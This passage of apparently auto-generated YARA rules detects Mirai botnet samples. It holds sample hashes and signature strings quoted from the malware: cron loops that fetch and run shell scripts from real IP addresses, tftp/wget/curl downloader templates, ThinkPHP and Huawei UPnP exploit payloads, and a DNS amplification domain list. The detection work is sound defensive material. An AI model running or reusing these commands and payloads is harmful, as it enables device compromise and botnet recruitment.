      $x11 = "f $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart')" ascii /* score: '31.00'*/
      $x12 = "    for t in curl wget; do T=/tmp/.s$$; if $t http://94.154.35.154/shell.sh>$T 2>/dev/null && [ -s $T ]; then sh $T&; rm -f $T; " ascii /* score: '31.00'*/
      $s13 = "      if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s14 = "        if $tool 'http://94.154.35.154/script.sh' > \"$TEMP_SCRIPT\" 2>/dev/null && [ -s \"$TEMP_SCRIPT\" ]; then" fullword ascii /* score: '28.00'*/
      $s15 = " -s $T ]; then sh $T&; rm -f $T; break; fi; rm -f $T; done; %s skidstart)' ; echo '@hourly for t in curl wget; do T=/tmp/.s$$; i" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 800KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d5f13ad_Mirai_signature__6d7d6efa_Mirai_signature__6e99c913_Mirai_signature__6f18cc27_Mirai_signature__6f_29 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d5f13ad.elf, Mirai(signature)_6d7d6efa.elf, Mirai(signature)_6e99c913.elf, Mirai(signature)_6f18cc27.elf, Mirai(signature)_6f3fdf62.elf, Mirai(signature)_70233742.elf, Mirai(signature)_702d0712.elf, Mirai(signature)_70b4d0fb.elf, Mirai(signature)_7216eb6b.elf, Mirai(signature)_7369befa.elf, Mirai(signature)_73ca547c.elf, Mirai(signature)_75840582.elf, Mirai(signature)_75fe77dd.elf, Mirai(signature)_7689b389.elf, Mirai(signature)_7814e080.elf, Mirai(signature)_79aa2ab1.elf, Mirai(signature)_7a246375.elf, Mirai(signature)_7d21c6a9.elf, Mirai(signature)_7e149841.elf, Mirai(signature)_7f0ec0ae.elf, Mirai(signature)_7fbd61b3.elf, Mirai(signature)_80ea7afa.elf, Mirai(signature)_80f6fae7.elf, Mirai(signature)_81a4de40.elf, Mirai(signature)_81c4c4de.elf, Mirai(signature)_836d4908.elf, Mirai(signature)_84105614.elf, Mirai(signature)_85088762.elf, Mirai(signature)_868c139f.elf, Mirai(signature)_87dc939b.elf, Mirai(signature)_88205620.elf, Mirai(signature)_88aa32a7.elf, Mirai(signature)_88ebd797.elf, Mirai(signature)_89740b6f.elf, Mirai(signature)_89b2ad80.elf, Mirai(signature)_8a9a5f5f.elf, Mirai(signature)_8ba790cf.elf, Mirai(signature)_8df6fd9b.elf, Mirai(signature)_8dfe2343.elf, Mirai(signature)_8fa422c4.elf, Mirai(signature)_8fef7dd2.elf, Mirai(signature)_90f10730.elf, Mirai(signature)_91463ce2.elf, Mirai(signature)_91e61b53.elf, Mirai(signature)_923e3a24.elf, Mirai(signature)_92cf164c.elf, Mirai(signature)_930f1916.elf, Mirai(signature)_94607fcc.elf, Mirai(signature)_95b1d1e3.elf, Mirai(signature)_96666598.elf, Mirai(signature)_96c173a5.elf, Mirai(signature)_96eeceb8.elf, Mirai(signature)_980313e3.elf, Mirai(signature)_987f7e76.elf, Mirai(signature)_98e064f1.elf, Mirai(signature)_9a9c9083.elf, Mirai(signature)_9b865817.elf, Mirai(signature)_9ba8a0de.elf, Mirai(signature)_9c93556d.elf, Mirai(signature)_9cab7a52.elf, Mirai(signature)_9d121a9f.elf, Mirai(signature)_9dc453dd.elf, Mirai(signature)_9dfdd53e.elf, Mirai(signature)_9e7f514e.elf, Mirai(signature)_9e81bdfc.elf, Mirai(signature)_9f66134e.elf, Mirai(signature)_9f871178.elf, Mirai(signature)_9fcd74fe.elf, Mirai(signature)_a0047106.elf, Mirai(signature)_a14b1550.elf, Mirai(signature)_a4016bd7.elf, Mirai(signature)_a495a051.elf, Mirai(signature)_a563fad3.elf, Mirai(signature)_a56de603.elf, Mirai(signature)_a5c0106e.elf, Mirai(signature)_a5e80f51.elf, Mirai(signature)_a66c3f07.elf, Mirai(signature)_a7fe34dc.elf, Mirai(signature)_a86f1bd9.elf, Mirai(signature)_a8fbbb34.elf, Mirai(signature)_a97aeb44.elf, Mirai(signature)_a98a5760.elf, Mirai(signature)_a9fe58e4.elf, Mirai(signature)_aa5c3e6b.elf, Mirai(signature)_ab3c438e.elf, Mirai(signature)_abbe5a87.elf, Mirai(signature)_ac8d3eb5.elf, Mirai(signature)_ae209387.elf, Mirai(signature)_ae5a3268.elf, Mirai(signature)_afc6b034.elf, Mirai(signature)_b0523bbf.elf, Mirai(signature)_b0c1836d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d5f13ada8501291aaf62f53db22577615d16f6a4755bc83b66a7a12bae039b2"
      hash2 = "6d7d6efad6071953d2c7f80a03a9d19fa6b0fede50b4fd109a72c980ff7f4ff3"
      hash3 = "6e99c913890c2656880af224cf8fb22e354453bb8f1418d506e514498b6539f2"
      hash4 = "6f18cc27a2a04a25f9f25691f3636588353cb37aa1791b52149451cbae46bbcc"
      hash5 = "6f3fdf624123f99fc4ffa14677aef9d2484ba9e1546f3fdda239571f418f7577"
      hash6 = "7023374287293202bd9794076550553181695ad19f51a5a8b242ec334644b84d"
      hash7 = "702d0712786d9cf7567ac92ee70e5b3da5c358bcc5e0876442cbd636d7d1e6f5"
      hash8 = "70b4d0fb871bce5751432308588a35df17c4289fc510daca98a2bbd29b1cb03f"
      hash9 = "7216eb6ba9ff9f3a0dc0c8665b2f7f49e3e799c279d8915e8456ad954d1fe091"
      hash10 = "7369befa4aef8dfc8e9cd6a7449c944b614f4ad57d90984a0450b035199ac5b5"
      hash11 = "73ca547c2e29de12ca67bc3536063726d39a8790d525a301bf9d761d3e9831b9"
      hash12 = "75840582164b170942726f7181066638f14c410a059183d0b57f4facd48193bb"
      hash13 = "75fe77dd77013bb89f7877de23f328a84ab410d1c2a7519e90da6773367c5c51"
      hash14 = "7689b3890c59b3631b63c4a3f2cd9647a90a4f1cb59810c94b6b0ac33bf3ede8"
      hash15 = "7814e080505f7f7c13dffc6705bee00d3eb9ae88d8a0d36b0c69cef6622fcf30"
      hash16 = "79aa2ab18d3c9354675a0af31339ebea64f876108c7b39ef0a9e7ddf8740e214"
      hash17 = "7a2463757caa27c347ee3f301a7ae1b2d7881ac305cf6c9ca78d35e6be943f12"
      hash18 = "7d21c6a95be4bd3d9bdb864db161fee339004977c2515e6eb0d9c88b2de0e69d"
      hash19 = "7e1498412c73e72664307d616eb23f272ec0e2fb973a61cc1c788bdfdc672008"
      hash20 = "7f0ec0ae8f5195468c98f26080e2bee8b370a4c7febcc156eafa6ae5dbc21809"
      hash21 = "7fbd61b3875260fc6ba82aad937104afecdaf4c5c0bb2ba11b1057cdb74f245c"
      hash22 = "80ea7afa94d421f26687ea4538174daec65c6d5e16020577a0a838f020594b89"
      hash23 = "80f6fae7894ad2c9c5a5193755eaf4d1eb80141cccb66fa35042b39ba844c0bc"
      hash24 = "81a4de40df5439551834e48c097107dd9176e89046e26127afbce71e614b0359"
      hash25 = "81c4c4deb29820b176bf08f1fd0fcabb64c7dce256645f3aae0411b378befc97"
      hash26 = "836d49089e7af8acca80ac853f6d62fb9440cc19c85a328c11233a02a0fad1a1"
      hash27 = "84105614022ee59cc89a5311631031b2f0c0870b3db2330997d82494ed048e8f"
      hash28 = "85088762d55a62537b044526545f72265778d85504cbab15d830881edf068bb9"
      hash29 = "868c139fb6669442895e64614b05b7a2f0b190a0582e977e877169a0352fd014"
      hash30 = "87dc939b0c977afb24185a6893f57faa03cc97c87a0b7c9fba5ee1cb414d0465"
      hash31 = "88205620c6b85a7794fcbda32ef9069f54ecaac56663de3acfb6bfd0a067fec0"
      hash32 = "88aa32a741dc62476112cbbacd3430f0c51069448caf7e06092471a34dafec14"
      hash33 = "88ebd79723ccf36c0ac0278f67a88131d58b15ff43965c38d26a0634a8691dba"
      hash34 = "89740b6f191a12f16106ca155abfed098c5115d50cf016762d609e2aa04b12a6"
      hash35 = "89b2ad8019928a89993af0c4d396567f5d4e448ff839e69c6cb12e78dc336d54"
      hash36 = "8a9a5f5f094ff1f318b90b6ad1ca0eb3eca9213fbd9a17f655804bbf2c5bf3a4"
      hash37 = "8ba790cf3f07819c0e15a612aed197567fccded3e7a5b0b61443c42050d2b984"
      hash38 = "8df6fd9b61eef8a24d93462df8bb16f8ae86c587fe0a2bc9a2786b19fd9de355"
      hash39 = "8dfe2343b164f4c101945d1432d7bc022807fdd7de52b39d915746e9da31d319"
      hash40 = "8fa422c411241bea096420eb18fbad99dd2d1a9fe9a59639a3d02cda4b184894"
      hash41 = "8fef7dd2b84929146cfbb95a912d9f41832652b6829dd91a045be4f0dcb7a9ea"
      hash42 = "90f107307a8e5a27352f7102c4ff05ff0c8c891566ff0dbfdab6991e6acdafee"
      hash43 = "91463ce2d8c9f2c13721e1cb0ef7e1604f9b133f5743d082c7311ec6c1db836a"
      hash44 = "91e61b5332910e1213cb4bfff73913f8868b36863dbbaf62e4ec0879f664be58"
      hash45 = "923e3a249551ae8345ce0c6a190ac745f768a3d50b6aabd0708757102259b74b"
      hash46 = "92cf164c638f09ddc9ca2c80888c9f9519f482d5bb544ab306e5f59f0e72b107"
      hash47 = "930f1916addc02bd033a82b384221521d5e9490f4b8a544b7c71545da3e8498b"
      hash48 = "94607fcc1bd1dd79bd0de8c9ff232fa302d1239c88c521883740b29824842c9d"
      hash49 = "95b1d1e3cf008a6d5d9afb027f6accb6aa42fca9ad1c2a51eaaaf274adde6b4a"
      hash50 = "96666598e29cd116b3405691a1831d54114b6d3a456a15d5d6efc1c9527885d8"
      hash51 = "96c173a50cc667e1bfae1a36410d3ec4a1bffe9b05680d6d40f89225d7ef4dfd"
      hash52 = "96eeceb8c2303233f4ae7ffa30d19b76a78e8a31c2d64d1fd9b26bcc8338bcb6"
      hash53 = "980313e319a6901fc1a0e56e2a8646311ffc185feb29676a6c00c841317c7de8"
      hash54 = "987f7e7678fa5d168d937a89fa4a82d696fa95831f0b1ed78dab74b6fc2a42e3"
      hash55 = "98e064f18c98e2b9e2dd8ed60a1a566e5927a4a845959b65366e1ced02b3e7ea"
      hash56 = "9a9c908365bb9e55ca2df9c508d725827a209e25759ce8466880873f4788b6d5"
      hash57 = "9b865817a24f8eb8ad2819feb9fdf4391bd2e2d7d39f1fe095604c56d410c7ac"
      hash58 = "9ba8a0de1aa1fba45d9921c8340bb4e4b81499d0f27f280c0d5a2d319c0b8565"
      hash59 = "9c93556dbebd463e50b99892482a567759ee8c554f441c966997dd52c63292c1"
      hash60 = "9cab7a52815df905dc2806b5b85aa4aa3553d5db14723831729387a882e2aac0"
      hash61 = "9d121a9f7ac9ee7068029d7e96202c34f34bebf40f3e202e7c94e3aa5f40fcad"
      hash62 = "9dc453dd4ff9d2f57b7a76b0148aa01d5eb3f655e5e0deea18e03c16a0060210"
      hash63 = "9dfdd53e8f34644db6c583eb1c2c99dc77b5ef395bcf230b9524c95f1920d566"
      hash64 = "9e7f514ea7c2b67ca2abf30273ee88d882c8988e1835b8745f3c7704b2b4cac7"
      hash65 = "9e81bdfc03e6f75e7e4c892851968608e32fbe7735bfc46830ec0892783b2072"
      hash66 = "9f66134e88ffe12da0c1a529777577f0d9b81133e4b755570e3dbda7f09b3b3b"
      hash67 = "9f871178080ad8152bb54a36dad17e52a6467ca4fa6235f2044c78d3cf5a9ed8"
      hash68 = "9fcd74fec43be953b48ce3263efff28766b511044033d3cbcf8851d11fd86322"
      hash69 = "a0047106ce51fdbe408c800ae7dd614b92d76c167af3fd1c949c85ada6220364"
      hash70 = "a14b1550aefed6210b15632aba9c8218a2bcaf60e31b896be99b8663eb923b83"
      hash71 = "a4016bd76a80622af455da0e6cd610c2172f32bc40601db1160b97740309fbcc"
      hash72 = "a495a051519e2148acbbd2244f5af32f796b8e02e977e43d5cf373a5e2cad019"
      hash73 = "a563fad34bb48a43ca0bea3929c24affc565699dbc4d4a2005713bef2e6ff591"
      hash74 = "a56de6035d2627d3d69e296dd06a3e20bc20ac4cbb55cb1fb040ca002539eae8"
      hash75 = "a5c0106e3ce705bba93e73e9979a6b3245d5ad8b91807224d452a7c7f1db89aa"
      hash76 = "a5e80f511ec892b0aafa357139a0ab79322a31d241d598be6708826728bcf3f8"
      hash77 = "a66c3f077a1a05e39fa30428349b465d8adb012fa42c683a8a01deebcc620f22"
      hash78 = "a7fe34dc6f89c8dc0aa3af74ee7c84838e41f0ea6406e4b319f9e7c77c5e3eb9"
      hash79 = "a86f1bd944df10b57601cff9b23223f37b8911588978aad68a4d893afb17fed1"
      hash80 = "a8fbbb34f439c0d34d564069164c08620095d1fe524c1c98019d99a09c2d7d99"
      hash81 = "a97aeb447dfceab7af61424ed52b1ac513d03cfcd6659c4bdb82d508893d06aa"
      hash82 = "a98a576008632e06cf785bfd3e074ddfd58ef6b1e38f2b80bb71bb4169f8a2f1"
      hash83 = "a9fe58e41551822b2ea37037f633edaa735b23a8d140516d0b7fb1f6a22b7cbd"
      hash84 = "aa5c3e6b9a4a8f87f696cc391201e39852b60f6e0c7ec81b20934cf406451b3d"
      hash85 = "ab3c438e902a906e23b9da59c947df25f80d58468c14c887c9d92e2e6306f507"
      hash86 = "abbe5a87daa71d57edfc111d89bfd63d00df492688b9e51bd8d876f1eed99dbd"
      hash87 = "ac8d3eb550b4397ff4418f7d862bf32fb2ba8d6a32966c20cffc1ac82479b102"
      hash88 = "ae209387803fa66644bd8970a7d7b36db75cbd5fe993a2e4bb33f325d4777363"
      hash89 = "ae5a3268854fd30334a5073798c662ea4713dfeacf5de9e4a2645dc8b02e812b"
      hash90 = "afc6b03443f504bf81e741311e779176503f3809bd91652508c4ee8cfd5b6316"
      hash91 = "b0523bbf3faa14375a6721e456e5950a456ed3903e7f108acdb489e4c1d613d7"
      hash92 = "b0c1836d3b251d6c5dcda23c547f861c8a920653e69e5e1a7d7e323da1e2b8f1"
   strings:
      $s1 = "cd %s && tftp -g -r %s %s" fullword ascii /* score: '23.00'*/
      $s2 = "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s" fullword ascii /* score: '20.00'*/
      $s3 = "tftp %s -c get %s %s" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://%s/%s/%s -O %s" fullword ascii /* score: '19.00'*/
      $s5 = "curl -o %s http://%s/%s/%s" fullword ascii /* score: '18.00'*/
      $s6 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/bin/wget" fullword ascii /* score: '9.00'*/
      $s10 = "/usr/bin/tftp" fullword ascii /* score: '9.00'*/
      $s11 = "/usr/bin/ftpget" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__6d126180_Mirai_signature__8c3c0665_Mirai_signature__8db6aad7_Mirai_signature__aea14cae_30 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_6d126180.elf, Mirai(signature)_8c3c0665.elf, Mirai(signature)_8db6aad7.elf, Mirai(signature)_aea14cae.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d12618046822d94cf918492ee8bbc152194935999cc82566a106a1305d91711"
      hash2 = "8c3c0665b3247e19ceaf3b60c4146de1ab77f1ac4d693f6fd37485e5371facd8"
      hash3 = "8db6aad767475b76f0069fa10985f741b7fb297e0a736c9431f12cddc4ec5b2e"
      hash4 = "aea14cae2e1a1177ab5a5c3c24ff03eb226e3ca6998df500c7973691e5fe8c7d"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $x2 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://212.16.87.33/bins/x86 -O thonkphp ; ch" ascii /* score: '40.00'*/
      $x3 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://212.16.87.33/bins/x86 -O thonkphp ; ch" ascii /* score: '37.00'*/
      $s4 = " -g 89.144.20.51 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>" ascii /* score: '30.00'*/
      $s5 = " /bin/busybox wget http://212.16.87.33/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh" fullword ascii /* score: '27.00'*/
      $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1" fullword ascii /* score: '27.00'*/
      $s7 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s8 = "User-Agent: Uirusu/2.0" fullword ascii /* score: '17.00'*/
      $s9 = "GET /index.php?s=/index/" fullword ascii /* score: '16.00'*/
      $s10 = "Host: 192.168.0.14:80" fullword ascii /* score: '14.00'*/
      $s11 = "mod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" fullword ascii /* score: '11.00'*/
      $s12 = "$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s13 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__70ae2421_Mirai_signature__70e11049_Mirai_signature__70f473c7_Mirai_signature__848869fb_Mirai_signature__86_31 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_70ae2421.elf, Mirai(signature)_70e11049.elf, Mirai(signature)_70f473c7.elf, Mirai(signature)_848869fb.elf, Mirai(signature)_869f50c7.elf, Mirai(signature)_89fa8230.elf, Mirai(signature)_a3bf5ed2.elf, Mirai(signature)_ae93d820.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "70ae2421c44888060b21a1bd3d083c12394a34f76f27b89a15a84684162aa2e5"
      hash2 = "70e110499d9b759dd240fad8e9a79bf21cb61801ef7f9bd7de9e4fe2b840ab4d"
      hash3 = "70f473c758172b4c8daebde3ec69f553dd250bfe49b65e15d8acfcc2383ba202"
      hash4 = "848869fbc73a981e67d9d828fbd59729bc07b88bd8d4677d8c8988aa2a5c07da"
      hash5 = "869f50c722c0eda6579569094f25ecae49e8ff5235fda937e4f147a1222dbebe"
      hash6 = "89fa82309afe76391b58e5d7a611e41d9743304f9d552fd10510cf062463928c"
      hash7 = "a3bf5ed2eb9c21403a3894b0f182ea6d21eb571dcaa566fbf9d02473303edc4c"
      hash8 = "ae93d820fb2fd9ec80de19f11ef6254b741d96de849f449ef664334e410eb8a6"
   strings:
      $s1 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '24.00'*/
      $s2 = "omany.ultradns-geo.organy.edgecastcdn.netlarge.spf.trusteddomain.orgdkim20._domainkey.godaddy.comtxt.awsdns-hostedzone-info.coma" ascii /* score: '21.00'*/
      $s3 = "live.com" fullword ascii /* score: '21.00'*/
      $s4 = "tiktok.com" fullword ascii /* score: '21.00'*/
      $s5 = "dnssec-root.iana.orgk.root-servers.netdnssec-failover.cloudflare.comany.dns.oracle.comany.dns.akamai-edge.netany.microsoft-dns.c" ascii /* score: '20.00'*/
      $s6 = "ns.bizdnssec.ripe.netdnssec-failed.orgroot-dnssec.netlarge-dns.akamai.comdns-bigresponse.cloudns.netlarge.txt.research.umbrella." ascii /* score: '20.00'*/
      $s7 = ".dehost-dane-self.weberdns.dehost-dnssec.weberdns.deany.isc.organy.cdn77.comany.awsdns-00.organy.cloudflare-dnssec.netany.ultrad" ascii /* score: '19.00'*/
      $s8 = "dns-bigresponse.cloudns.netlarge.txt.research.umbrella.com" fullword ascii /* score: '18.00'*/
      $s9 = "combigtxt.dns-oarc.netipv6.ripe.netaaaa.nasa.govipv6.google.comipv6.research.ix.ruipv6.6bone.netroot-servers.netdnssec.icann.org" ascii /* score: '16.00'*/
      $s10 = "nasa.gov" fullword ascii /* score: '10.00'*/
      $s11 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

